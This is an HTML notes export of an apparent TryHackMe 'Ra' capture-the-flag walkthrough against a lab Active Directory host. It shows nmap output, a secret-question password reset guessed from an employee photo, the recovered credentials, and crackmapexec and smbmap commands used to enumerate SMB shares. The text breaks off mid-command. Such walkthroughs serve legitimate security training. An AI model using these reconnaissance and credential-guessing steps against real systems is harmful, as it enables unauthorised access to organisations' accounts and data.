<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>ra</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>ra</h1><br/><strong><h1>THM: Ra</h1></strong><br /><br /><strong><h2>Enumeration</h2></strong><br /><br /><strong><h2>Nmap</h2></strong><br />Nmap scan report for 10.10.61.102<br />Host is up (0.21s latency).<br /><br />PORT      STATE SERVICE         VERSION<br />53/tcp    open  domain          Simple DNS Plus<br />80/tcp    open  http            Microsoft IIS httpd 10.0<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />|_http-server-header: Microsoft-IIS/10.0<br />|_http-title: Windcorp.<br />88/tcp    open  kerberos-sec    Microsoft Windows Kerberos (server time: 2022-07-05 10:10:49Z)<br />135/tcp   open  msrpc           Microsoft Windows RPC<br />139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn<br />389/tcp   open  ldap            Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)<br />445/tcp   open  microsoft-ds?<br />464/tcp   open  kpasswd5?<br />593/tcp   open  ncacn_http      Microsoft Windows RPC over HTTP 1.0<br />636/tcp   open  tcpwrapped<br />2179/tcp  open  vmrdp?<br />3268/tcp  open  ldap            Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)<br />3269/tcp  open  tcpwrapped<br />5222/tcp  open  jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later<br />| ssl-cert: Subject: commonName=fire.windcorp.thm<br />| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm<br />| Not valid before: 2020-05-01T08:39:00<br />|_Not valid after:  2025-04-30T08:39:00<br />|_ssl-date: 2022-07-05T10:12:45+00:00; -6s from scanner time.<br />| xmpp-info: <br />|   STARTTLS Failed<br />|   info: <br />|     capabilities: <br />|     compression_methods: <br />|     stream_id: ql1ey8azp<br />|     unknown: <br />|     errors: <br />|       invalid-namespace<br />|       (timeout)<br />|     xmpp: <br />|       version: 1.0<br />|     auth_mechanisms: <br />|_    features: <br />5223/tcp  open  ssl/jabber<br />| ssl-cert: Subject: commonName=fire.windcorp.thm<br />| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm<br />| Not valid before: 2020-05-01T08:39:00<br />|_Not valid after:  2025-04-30T08:39:00<br />| xmpp-info: <br />|   STARTTLS Failed<br />|   info: <br />|     capabilities: <br />|     compression_methods: <br />|     unknown: <br />|     errors: <br />|       (timeout)<br />|     xmpp: <br />|     auth_mechanisms: <br />|_    features: <br />| fingerprint-strings: <br />|   RPCCheck: <br />|_    &lt;stream:error xmlns:stream=&quot;http://etherx.jabber.org/streams&quot;&gt;&lt;not-well-formed xmlns=&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:str<br />eam&gt;<br />|_ssl-date: 2022-07-05T10:12:43+00:00; -5s from scanner time.<br />5229/tcp  open  jaxflow?<br />5262/tcp  open  jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later<br />| xmpp-info: <br />|   STARTTLS Failed<br />|   info: <br />|     capabilities: <br />|     compression_methods: <br />|     stream_id: 8llxbuqonw<br />|     unknown: <br />|     errors: <br />|       invalid-namespace<br />|       (timeout)<br />|     xmpp: <br />|       version: 1.0<br />|     auth_mechanisms: <br />|_    features: <br />5263/tcp  open  ssl/jabber<br />|_ssl-date: 2022-07-05T10:12:43+00:00; -6s from scanner time.<br />| ssl-cert: Subject: commonName=fire.windcorp.thm<br />| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm<br />| Not valid before: 2020-05-01T08:39:00<br />|_Not valid after:  2025-04-30T08:39:00<br />| xmpp-info: <br />|   STARTTLS Failed<br />|   info: <br />|     capabilities: <br />|     compression_methods: <br />|     unknown: <br />|     errors: <br />|       (timeout)<br />|     xmpp: <br />|     auth_mechanisms: <br />|_    features: <br />| fingerprint-strings: <br />|   RPCCheck: <br />|_    &lt;stream:error xmlns:stream=&quot;http://etherx.jabber.org/streams&quot;&gt;&lt;not-well-formed xmlns=&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;/&gt;&lt;/stream:error&gt;&lt;/stream:str<br />eam&gt;<br />5269/tcp  open  xmpp            Wildfire XMPP Client<br />| xmpp-info: <br />|   STARTTLS Failed<br />|   info: <br />|     capabilities: <br />|     compression_methods: <br />|     unknown: <br />|     errors: <br />|       (timeout)<br />|     xmpp: <br />|     auth_mechanisms: <br />|_    features: <br />5270/tcp  open  ssl/xmpp        Wildfire XMPP Client<br />|_ssl-date: 2022-07-05T10:12:43+00:00; -5s from scanner time.<br />| ssl-cert: Subject: commonName=fire.windcorp.thm<br />| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm<br />| Not valid before: 2020-05-01T08:39:00<br />|_Not valid after:  2025-04-30T08:39:00<br />5275/tcp  open  jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later<br />| xmpp-info: <br />|   STARTTLS Failed<br />|   info: <br />|     capabilities: <br />|     compression_methods: <br />|     stream_id: 5wyjhbdxpm<br />|     unknown: <br />|     errors: <br />|       invalid-namespace<br />|       (timeout)<br />|     xmpp: <br />|       version: 1.0<br />|     auth_mechanisms: <br />|_    features: <br />5276/tcp  open  ssl/jabber      Ignite Realtime Openfire Jabber server 3.10.0 or later<br />|_ssl-date: 2022-07-05T10:12:43+00:00; -6s from scanner time.<br />| xmpp-info: <br />|   STARTTLS Failed<br />|   info: <br />|     capabilities: <br />|     compression_methods: <br />|     unknown: <br />|     errors: <br />|       (timeout)<br />|     xmpp: <br />|     auth_mechanisms: <br />|_    features: <br />| ssl-cert: Subject: commonName=fire.windcorp.thm<br />| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm<br />| Not valid before: 2020-05-01T08:39:00<br />|_Not valid after:  2025-04-30T08:39:00<br />7070/tcp  open  http            Jetty 9.4.18.v20190429<br />|_http-server-header: Jetty(9.4.18.v20190429)<br />|_http-title: Openfire HTTP Binding Service<br />7443/tcp  open  ssl/http        Jetty 9.4.18.v20190429<br />|_http-server-header: Jetty(9.4.18.v20190429)<br />|_http-title: Openfire HTTP Binding Service<br />| ssl-cert: Subject: commonName=fire.windcorp.thm<br />| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm<br />| Not valid before: 2020-05-01T08:39:00<br />|_Not valid after:  2025-04-30T08:39:00<br />7777/tcp  open  socks5          (No authentication; connection failed)<br />| socks-auth-info: <br />|_  No authentication<br />9090/tcp  open  zeus-admin?<br />| fingerprint-strings: <br />|   GetRequest: <br />|     HTTP/1.1 200 OK<br />|     Date: Tue, 05 Jul 2022 10:10:55 GMT<br />|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT<br />|     Content-Type: text/html<br />|     Accept-Ranges: bytes<br />|     Content-Length: 115<br />|     &lt;html&gt;<br />|     &lt;head&gt;&lt;title&gt;&lt;/title&gt;<br />|     &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=index.jsp&quot;&gt;<br />|     &lt;/head&gt;<br />|     &lt;body&gt;<br />|     &lt;/body&gt;<br />|     &lt;/html&gt;<br />|   JavaRMI, drda, ibm-db2-das, informix: <br />|     HTTP/1.1 400 Illegal character CNTL=0x0<br />|     Content-Type: text/html;charset=iso-8859-1<br />|     Content-Length: 69<br />|     Connection: close<br />|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x0&lt;/pre&gt;<br />|   SqueezeCenter_CLI: <br />|     HTTP/1.1 400 No URI<br />|     Content-Type: text/html;charset=iso-8859-1<br />|     Content-Length: 49<br />|     Connection: close<br />|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: No URI&lt;/pre&gt;<br />|   WMSRequest: <br />|     HTTP/1.1 400 Illegal character CNTL=0x1<br />|     Content-Type: text/html;charset=iso-8859-1<br />|     Content-Length: 69<br />|     Connection: close<br />|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x1&lt;/pre&gt;<br />9091/tcp  open  xmltec-xmlmail?<br />| ssl-cert: Subject: commonName=fire.windcorp.thm<br />| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm<br />| Not valid before: 2020-05-01T08:39:00<br />|_Not valid after:  2025-04-30T08:39:00<br />9389/tcp  open  mc-nmf          .NET Message Framing<br />49671/tcp open  msrpc           Microsoft Windows RPC<br />49674/tcp open  ncacn_http      Microsoft Windows RPC over HTTP 1.0<br />49675/tcp open  msrpc           Microsoft Windows RPC<br />49676/tcp open  msrpc           Microsoft Windows RPC<br />49745/tcp open  msrpc           Microsoft Windows RPC<br /><br /><br />Its a windows machine on Active Directory with lots of open ports.<br /><br /><strong><h3>Website Enumeration</h3></strong><br /><img src="images/46-1.png" alt="images/46-1.png" /><br /><br />Upon opening the webpage and looking into network, we find most rquests from <strong>fire.windcorp.thm</strong><br />So we will add it our hosts file.<br /><br /><img src="images/46-2.png" alt="images/46-2.png" /><br />abcdef<br /><img src="images/46-3.png" alt="images/46-3.png" /><br /><br /><strong><h3>Website Foothold</h3></strong><br />When we click on Reset Password, we get a window asking for <strong>username</strong> and <strong>answer to a secret question</strong>.<br />Lets explore the site to find these details.<br /><br /><img src="images/46-4.png" alt="images/46-4.png" /><br /><br /><strong><h3>Credential Search</h3></strong><br /><br /><img src="images/46-5.png" alt="images/46-5.png" /><br /><br />We scroll down the page and find an employee picture with a dog whom she refers to as her best friend. Lets inspect the image.<br /><img src="images/46-6.png" alt="images/46-6.png" /><br /><br />The name of the file is <strong>lilyleAndSparky.jpg</strong><br />We use these in the credentail reset window<br /><br /><strong>Username: lilyle<br />What is/was your favourite pet&#39;s name: Sparky</strong><br /><br /><img src="images/46-7.png" alt="images/46-7.png" /><br /><br />Then Hit <strong>Reset</strong><br /><img src="images/46-8.png" alt="images/46-8.png" /><br /><br /><br /><strong>Credentials Found:</strong><br /><br /><strong>Username: lilyle<br />Password: ChangeMe#1234</strong><br /><br /><br />Next, we need to verify whether the credentials found is of the domain/machine or not. For this testing purpose we use <strong>crackmapexec</strong><br /><br /><strong>crackmapexec smb 10.10.111.3 -u lilyle -p ChangeMe#1234</strong><br /><img src="images/46-9.png" alt="images/46-9.png" /><br /><br /><br />Note: From here, we can also try to Login to the system using <strong>Evil-WinRM</strong>.<br />However, the user must be in the group “<strong>Remote Management Users</strong>” for it to work.<br /><br />[As it turns out the user <strong>lilyle</strong> is not in that group. <strong>Evil-WinRM</strong> login not possbile]<br /><br /><strong><h3>Samba Enumeration</h3></strong><br />As we are sure that we have a user credentail, lets enumerate Samba using it.<br />We will use <strong>smbmap</strong><br /><br /><strong>smbmap -H 10.10.111.3 -u lilyle -p ChangeMe#1234 -R</strong><br /><br />[+] IP: 10.10.111.3:445 Name: fire.windcorp.thm                                 <br />        Disk                                                    Permissions     Comment<br />        ----                                                    -----------     -------<br />        ADMIN$                                                  NO ACCESS       Remote Admin<br />        C$                                                      NO ACCESS       Default share<br />        IPC$                                                    READ ONLY       Remote IPC<br />        .\IPC$\*<br />        fr--r--r--                3 Mon Jan  1 05:53:28 1601    InitShutdown<br />        fr--r--r--                5 Mon Jan  1 05:53:28 1601    lsass<br />        fr--r--r--                3 Mon Jan  1 05:53:28 1601    ntsvcs<br />        fr--r--r--                4 Mon Jan  1 05:53:28 1601    scerpc<br />        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-22c-0<br />        fr--r--r--                3 Mon Jan  1 05:53:28 1601    epmapper<br />        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-2c0-0<br />        fr--r--r--                3 Mon Jan  1 05:53:28 1601    LSM_API_service<br />        fr--r--r--                3 Mon Jan  1 05:53:28 1601    eventlog<br />        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-634-0<br />        fr--r--r--                3 Mon Jan  1 05:53:28 1601    atsvc<br />        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-774-0<br />        fr--r--r--                4 Mon Jan  1 05:53:28 1601    wkssvc<br />        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-348-0<br />        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-348-1<br />        fr--r--r--                3 Mon Jan  1 05:53:28 1601    RpcProxy\49674<br />        fr--r--r--                3 Mon Jan  1 05:53:28 1601    1f57f139904a3038<br />        fr--r--r--                3 Mon Jan  1 05:53:28 1601    RpcProxy\593<br />        fr--r--r--                4 Mon Jan  1 05:53:28 1601    srvsvc<br />        fr--r--r--                3 Mon Jan  1 05:53:28 1601    spoolss<br />        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-924-0<br />        fr--r--r--                3 Mon Jan  1 05:53:28 1601    netdfs<br />        fr--r--r--                3 Mon Jan  1 05:53:28 1601    ROUTER<br />        fr--r--r--                3 Mon Jan  1 05:53:28 1601    W32TIME_ALT<br />        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-334-0<br />        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-d24-0<br />        fr--r--r--                1 Mon Jan  1 05:53:28 1601    PSHost.133015911942074326.4116.DefaultAppDomain.powershell<br />        fr--r--r--                1 Mon Jan  1 05:53:28 1601    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER<br />        fr--r--r--                3 Mon Jan  1 05:53:28 1601    TermSrv_API_service<br />        fr--r--r--                3 Mon Jan  1 05:53:28 1601    Ctx_WinStation_API_service<br />        fr--r--r--                3 Mon Jan  1 05:53:28 1601    SessEnvPublicRpc<br />        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-1780-0<br />        fr--r--r--                1 Mon Jan  1 05:53:28 1601    iisipmd98a47c3-d054-43cb-b1e4-78c8a527c8a0<br />        fr--r--r--                1 Mon Jan  1 05:53:28 1601    iislogpiped0963e57-86c9-4b02-a5a9-35ef24a25a42<br />        fr--r--r--                1 Mon Jan  1 05:53:28 1601    PSHost.133015913380842745.6828.DefaultAppDomain.powershell<br />        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-cf0-0<br />        fr--r--r--                1 Mon Jan  1 05:53:28 1601    PSHost.133015911908150522.3604.DefaultAppDomain.sme<br />        NETLOGON                                                READ ONLY       Logon server share <br />        .\NETLOGON\*<br />        dr--r--r--                0 Sat May  2 15:32:19 2020    .<br />        dr--r--r--                0 Sat May  2 15:32:19 2020    ..<br />        Shared                                                  READ ONLY<br />        .\Shared\*<br />        dr--r--r--                0 Sat May 30 06:15:42 2020    .<br />        dr--r--r--                0 Sat May 30 06:15:42 2020    ..<br />        fr--r--r--               45 Fri May  1 21:02:36 2020    Flag 1.txt<br />        fr--r--r--         29526628 Sat May 30 06:15:01 2020    spark_2_8_3.deb<br />        fr--r--r--         99555201 Sun May  3 16:38:39 2020    spark_2_8_3.dmg<br />        fr--r--r--         78765568 Sun May  3 16:38:39 2020    spark_2_8_3.exe<br />        fr--r--r--        123216290 Sun May  3 16:38:39 2020    spark_2_8_3.tar.gz<br />        SYSVOL                                                  READ ONLY       Logon server share <br />        .\SYSVOL\*<br />        dr--r--r--                0 Sat May  2 15:32:20 2020    .<br />        dr--r--r--                0 Sat May  2 15:32:20 2020    ..<br />        dr--r--r--                0 Sat May  2 15:32:20 2020    NRznLVEcPj<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    windcorp.thm<br />        .\SYSVOL\windcorp.thm\*<br />        dr--r--r--                0 Thu Apr 30 20:47:20 2020    .<br />        dr--r--r--                0 Thu Apr 30 20:47:20 2020    ..<br />        dr--r--r--                0 Wed Jul  6 20:01:39 2022    DfsrPrivate<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    Policies<br />        dr--r--r--                0 Sat May  2 15:32:19 2020    scripts<br />        .\SYSVOL\windcorp.thm\Policies\*<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    .<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    ..<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    {31B2F340-016D-11D2-945F-00C04FB984F9}<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    {6AC1786C-016F-11D2-945F-00C04fB984F9}<br />        .\SYSVOL\windcorp.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    .<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    ..<br />        fr--r--r--               23 Fri May  8 18:45:01 2020    GPT.INI<br />        dr--r--r--                0 Fri May  1 17:02:28 2020    MACHINE<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    USER<br />        .\SYSVOL\windcorp.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*<br />        dr--r--r--                0 Thu May  7 13:04:46 2020    .<br />        dr--r--r--                0 Thu May  7 13:04:46 2020    ..<br />        dr--r--r--                0 Thu May  7 13:04:46 2020    Applications<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    Microsoft<br />        fr--r--r--             2792 Thu Apr 30 20:48:05 2020    Registry.pol<br />        dr--r--r--                0 Fri May  1 17:02:28 2020    Scripts<br />        .\SYSVOL\windcorp.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    .<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    ..<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    Windows NT<br />        .\SYSVOL\windcorp.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Scripts\*<br />        dr--r--r--                0 Fri May  1 17:02:28 2020    .<br />        dr--r--r--                0 Fri May  1 17:02:28 2020    ..<br />        dr--r--r--                0 Fri May  1 17:02:28 2020    Shutdown<br />        dr--r--r--                0 Fri May  1 17:02:28 2020    Startup<br />        .\SYSVOL\windcorp.thm\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    .<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    ..<br />        fr--r--r--               23 Thu May  7 13:04:35 2020    GPT.INI<br />        dr--r--r--                0 Fri May  1 15:25:05 2020    MACHINE<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    USER<br />        .\SYSVOL\windcorp.thm\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*<br />        dr--r--r--                0 Fri May  1 15:25:05 2020    .<br />        dr--r--r--                0 Fri May  1 15:25:05 2020    ..<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    Microsoft<br />        dr--r--r--                0 Fri May  1 15:25:05 2020    Scripts<br />        .\SYSVOL\windcorp.thm\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    .<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    ..<br />        dr--r--r--                0 Thu Apr 30 20:41:10 2020    Windows NT<br />        .\SYSVOL\windcorp.thm\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Scripts\*<br />        dr--r--r--                0 Fri May  1 15:25:05 2020    .<br />        dr--r--r--                0 Fri May  1 15:25:05 2020    ..<br />        dr--r--r--                0 Fri May  1 15:25:05 2020    Shutdown<br />        dr--r--r--                0 Fri May  1 15:25:05 2020    Startup<br />        Users                                                   READ ONLY<br />        .\Users\*<br />        dw--w--w--                0 Sun May  3 03:35:58 2020    .<br />        dw--w--w--                0 Sun May  3 03:35:58 2020    ..<br />        dr--r--r--                0 Sun May 10 16:48:11 2020    Administrator<br />        dr--r--r--                0 Fri May  1 06:03:55 2020    All Users<br />        dr--r--r--                0 Fri May  1 18:39:44 2020    angrybird<br />        dr--r--r--                0 Fri May  1 18:39:34 2020    berg<br />        dr--r--r--                0 Fri May  1 18:39:22 2020    bluefrog579<br />        dr--r--r--                0 Sun May  3 19:00:02 2020    brittanycr<br />        dr--r--r--                0 Fri May  1 18:39:08 2020    brownostrich284<br />        dr--r--r--                0 Wed Jul  6 19:58:34 2022    buse<br />        dw--w--w--                0 Fri May  1 05:05:11 2020    Default<br />        dr--r--r--                0 Fri May  1 06:03:55 2020    Default User<br />        fr--r--r--              174 Fri May  1 06:01:55 2020    desktop.ini<br />        dr--r--r--                0 Fri May  1 18:38:54 2020    edward<br />        dr--r--r--                0 Sun May  3 05:00:16 2020    freddy<br />        dr--r--r--                0 Fri May  1 18:38:28 2020    garys<br />        dr--r--r--                0 Wed Jul  6 20:16:05 2022    goldencat416<br />        dr--r--r--                0 Fri May  1 18:38:17 2020    goldenwol<br />        dr--r--r--                0 Fri May  1 18:38:06 2020    happ<br />        dr--r--r--                0 Fri May  1 18:37:53 2020    happyme<br />        dr--r--r--                0 Fri May  1 18:37:42 2020    Luis<br />        dr--r--r--                0 Fri May  1 18:37:31 2020    orga<br />        dr--r--r--                0 Fri May  1 18:37:19 2020    organicf<br />        dr--r--r--                0 Wed Jul  6 20:16:59 2022    organicfish718<br />        dr--r--r--                0 Fri May  1 18:37:06 2020    pete<br />        dw--w--w--                0 Thu Apr 30 20:05:47 2020    Public<br />        dr--r--r--                0 Fri May  1 18:36:54 2020    purplecat<br />        dr--r--r--                0 Fri May  1 18:36:42 2020    purplepanda<br />        dr--r--r--                0 Fri May  1 18:36:31 2020    sadswan<br />        dr--r--r--                0 Wed Jul  6 20:17:23 2022    sadswan869<br />        dr--r--r--                0 Fri May  1 18:36:20 2020    sheela<br />        dr--r--r--                0 Fri May  1 18:35:39 2020    silver<br />        dr--r--r--                0 Fri May  1 18:35:24 2020    smallf<br />        dr--r--r--                0 Fri May  1 18:35:05 2020    spiff<br />        dr--r--r--                0 Fri May  1 18:34:49 2020    tinygoos<br />        dr--r--r--                0 Fri May  1 18:33:57 2020    whiteleopard<br />        .\Users\Default\*<br />        dw--w--w--                0 Fri May  1 05:05:11 2020    .<br />        dw--w--w--                0 Fri May  1 05:05:11 2020    ..<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    AppData<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    Application Data<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    Cookies<br />        dw--w--w--                0 Fri May  1 06:03:35 2020    Desktop<br />        dw--w--w--                0 Fri May  1 05:05:11 2020    Documents<br />        dw--w--w--                0 Fri May  1 06:03:35 2020    Downloads<br />        dw--w--w--                0 Fri May  1 06:03:35 2020    Favorites<br />        dw--w--w--                0 Fri May  1 06:03:35 2020    Links<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    Local Settings<br />        dw--w--w--                0 Fri May  1 06:03:35 2020    Music<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    My Documents<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    NetHood<br />        fr--r--r--           262144 Fri May  1 06:03:04 2020    NTUSER.DAT<br />        fr--r--r--            57344 Fri May  1 06:03:04 2020    NTUSER.DAT.LOG1<br />        fr--r--r--                0 Fri May  1 06:03:35 2020    NTUSER.DAT.LOG2<br />        fr--r--r--            65536 Fri May  1 05:05:11 2020    NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf<br />        fr--r--r--           524288 Fri May  1 05:05:11 2020    NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms<br />        fr--r--r--           524288 Fri May  1 05:05:11 2020    NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms<br />        dw--w--w--                0 Fri May  1 06:03:35 2020    Pictures<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    PrintHood<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    Recent<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    Saved Games<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    SendTo<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    Start Menu<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    Templates<br />        dw--w--w--                0 Fri May  1 06:03:35 2020    Videos<br />        .\Users\Default\AppData\*<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    .<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    ..<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    Local<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    Roaming<br />        .\Users\Default\AppData\Local\*<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    .<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    ..<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    Application Data<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    History<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    Microsoft<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    Temp<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    Temporary Internet Files<br />        .\Users\Default\AppData\Local\Microsoft\*<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    .<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    ..<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    InputPersonalization<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    Windows<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    Windows Sidebar<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    WindowsApps<br />        .\Users\Default\AppData\Local\Microsoft\InputPersonalization\*<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    .<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    ..<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    TrainedDataStore<br />        .\Users\Default\AppData\Local\Microsoft\Windows\*<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    .<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    ..<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    CloudStore<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    GameExplorer<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    History<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    INetCache<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    INetCookies<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    Shell<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    Temporary Internet Files<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    WinX<br />        .\Users\Default\AppData\Local\Microsoft\Windows Sidebar\*<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    .<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    ..<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    Gadgets<br />        fr--r--r--               80 Fri May  1 06:03:04 2020    settings.ini<br />        .\Users\Default\AppData\Roaming\*<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    .<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    ..<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    Microsoft<br />        .\Users\Default\AppData\Roaming\Microsoft\*<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    .<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    ..<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    Internet Explorer<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    Windows<br />        .\Users\Default\AppData\Roaming\Microsoft\Internet Explorer\*<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    .<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    ..<br />        dw--w--w--                0 Fri May  1 06:03:35 2020    Quick Launch<br />        .\Users\Default\AppData\Roaming\Microsoft\Windows\*<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    .<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    ..<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    CloudStore<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    Network Shortcuts<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    Printer Shortcuts<br />        dw--w--w--                0 Fri May  1 06:03:35 2020    Recent<br />        dw--w--w--                0 Fri May  1 06:03:35 2020    SendTo<br />        dw--w--w--                0 Fri May  1 06:03:35 2020    Start Menu<br />        dr--r--r--                0 Fri May  1 06:03:35 2020    Templates<br />        .\Users\Default\Documents\*<br />        dw--w--w--                0 Fri May  1 05:05:11 2020    .<br />        dw--w--w--                0 Fri May  1 05:05:11 2020    ..<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    My Music<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    My Pictures<br />        dr--r--r--                0 Fri May  1 05:05:11 2020    My Videos<br /><br /><strong>Inresting FInd</strong><br /><img src="images/46-10.png" alt="images/46-10.png" /><br /><br /><br /><strong>Smbclient</strong><br /><br />We get the flag and inspect the executible files inside the share.<br /><br /><img src="images/46-11.png" alt="images/46-11.png" /><br /><br /><br />We once again take a look at the nmap results and see that port <strong>5222</strong> is open:<br />5222/tcp open jabber syn-ack <strong>Ignite Realtime Openfire Jabber server 3.10.0 or later</strong><br /><br />This, combined with the <strong>spark_2_8_3</strong> files in the smb share got me thinking that we need to install the Spark IM client and somehow do some client-side exploitation.<br /><br />We download the installation file for Spark and install it:<br /><br /><strong>dpkg -i 